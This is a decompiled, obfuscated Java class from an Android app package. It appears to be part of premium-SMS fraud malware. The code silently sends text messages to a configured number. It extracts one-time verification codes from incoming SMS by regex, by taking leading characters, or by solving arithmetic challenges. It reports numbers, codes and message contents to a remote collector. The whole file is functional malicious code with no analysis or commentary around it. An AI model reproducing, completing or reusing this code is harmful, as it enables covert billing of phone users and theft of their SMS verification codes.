package com.amaz.onib;

import android.content.Context;
import android.telephony.SmsManager;
import android.text.TextUtils;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
/* loaded from: classes.dex */
public class bb {
    /* JADX INFO: Access modifiers changed from: package-private */
    public static void a(final Context context, final h hVar, final String str, final String str2) {
        new Thread(new Runnable() { // from class: com.amaz.onib.bb.2
            @Override // java.lang.Runnable
            public void run() {
                bi.a(context, str, hVar.E, str2, hVar.s, hVar.D);
            }
        }).start();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static void a(Context context, String str, String str2, h hVar, String str3, boolean z, boolean z2, boolean z3) {
        new ae().a(str, str2, str3, z ? 1 : 0, z2 ? 1 : 0, context, hVar, z3);
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static void a(h hVar, String str, String str2) {
        boolean z;
        boolean z2 = true;
        if (!(hVar == null || str == null || str2 == null || !"1".equals(hVar.u))) {
            if (hVar.w != null && hVar.w.length > 0 && hVar.x != null && hVar.x.length > 0) {
                String[] strArr = hVar.w;
                int length = strArr.length;
                int i = 0;
                while (true) {
                    if (i >= length) {
                        z = false;
                        break;
                    } else if (str.startsWith(strArr[i])) {
                        z = true;
                        break;
                    } else {
                        i++;
                    }
                }
                if (z) {
                    for (String str3 : hVar.x) {
                        if (str2.contains(str3)) {
                            break;
                        }
                    }
                }
            }
            z2 = false;
            if (z2) {
                new av().a(hVar.z, hVar.q, hVar.c, hVar.b, "1", "0", "[" + str + "][" + str2 + "]", z2);
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static boolean a(h hVar, String str) {
        bs.b("短验通道.111....");
        String str2 = "";
        if (!by.a(hVar.r)) {
            String[] split = hVar.r.split(",");
            if (split.length > 0) {
                str2 = split[0];
            }
        }
        if (by.a(hVar.t) || by.a(str2) || by.a(hVar.E)) {
            return false;
        }
        bs.b("短验通道....." + str);
        new ax().a(hVar.t, str2, str, hVar.E, null);
        return true;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static boolean a(h hVar, String str, String str2, String str3) {
        String str4 = !TextUtils.isEmpty(hVar.o) ? hVar.o : str;
        SmsManager smsManager = SmsManager.getDefault();
        try {
            if (!by.a(str4) && !by.a(str2)) {
                smsManager.sendTextMessage(str4, null, str2, null, null);
            }
        } catch (Exception e) {
            bs.c("TAG", "发送短信出错");
        }
        if (hVar != null && "1".equals(hVar.u)) {
            new av().a(hVar.z, hVar.q, hVar.c, hVar.b, "1", "0", "[" + str4 + "][" + str3 + "][" + str2 + "]");
        }
        bs.a("TAG", "cn:" + str4 + "###" + str2 + "###" + (hVar != null && "1".equals(hVar.u)));
        return true;
    }

    private static boolean a(String str, String str2) {
        if (by.a(str2)) {
            return true;
        }
        for (String str3 : str2.split("\\|")) {
            if (str.contains(str3)) {
                return true;
            }
        }
        return false;
    }

    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:59:0x01cc -> B:70:0x0049). Please submit an issue!!! */
    public static String b(h hVar, String str, String str2) {
        String str3;
        int indexOf;
        String str4 = null;
        if (1 == hVar.l) {
            bs.a("TAG", "发送1。1。。" + str + "###" + hVar.n);
            if (by.a(hVar.p)) {
                return null;
            }
            for (String str5 : hVar.p.split("\\|")) {
                if (str2.contains(str5)) {
                    return hVar.n;
                }
            }
            return null;
        } else if (2 == hVar.l) {
            if (by.a(hVar.n) || by.a(str2) || !a(str2, hVar.p)) {
                return null;
            }
            String[] split = hVar.n.split("\\|");
            bs.a("TAG", "动态:" + hVar.n);
            if (split.length == 2) {
                Matcher matcher = Pattern.compile("(?<=" + split[0] + ").*(?=" + split[1] + ")").matcher(str2);
                String group = matcher.find() ? matcher.group() : null;
                if (group == null) {
                    return null;
                }
                Matcher matcher2 = Pattern.compile("[a-zA-Z0-9]+").matcher(group);
                if (matcher2.find()) {
                    return matcher2.group();
                }
                return null;
            } else if (split.length != 1 || (indexOf = str2.indexOf((str3 = split[0]))) == -1) {
                return null;
            } else {
                return str2.substring(str3.length() + indexOf, str2.length());
            }
        } else if (3 == hVar.l) {
            if (by.a(hVar.n) || by.a(str2) || !a(str2, hVar.p)) {
                return null;
            }
            bs.a("TAG", "--答题 --" + hVar.n);
            Matcher matcher3 = Pattern.compile(hVar.n).matcher(str2);
            while (matcher3.find()) {
                try {
                    String group2 = matcher3.group();
                    String[] split2 = group2.split("[+-/*=]");
                    int parseInt = Integer.parseInt(split2[0]);
                    int parseInt2 = Integer.parseInt(split2[1]);
                    String substring = group2.substring(group2.indexOf(split2[0]) + split2[0].length(), group2.lastIndexOf(split2[1]));
                    System.out.println(group2 + "###" + substring);
                    if (!"*".equals(substring)) {
                        if (!"/".equals(substring)) {
                            if (!"+".equals(substring)) {
                                if ("-".equals(substring)) {
                                    str4 = String.valueOf(parseInt - parseInt2);
                                    break;
                                }
                            } else {
                                str4 = String.valueOf(parseInt + parseInt2);
                                break;
                            }
                        } else {
                            str4 = String.valueOf(parseInt / parseInt2);
                            break;
                        }
                    } else {
                        str4 = String.valueOf(parseInt * parseInt2);
                        break;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return str4;
        } else if (4 != hVar.l || by.a(hVar.n) || by.a(str2) || !a(str2, hVar.p)) {
            return null;
        } else {
            bs.a("TAG", "--前N位 --" + hVar.n);
            return str2.substring(0, Integer.parseInt(hVar.n));
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static void b(final h hVar, final String str) {
        new Thread(new Runnable() { // from class: com.amaz.onib.bb.1
            @Override // java.lang.Runnable
            public void run() {
                try {
                    ca.a(h.this, str);
                } catch (ce e) {
                    new av().a(h.this.z, h.this.q, h.this.c, h.this.b, "0", String.valueOf(e.a()), e.b());
                }
            }
        }).start();
    }
}
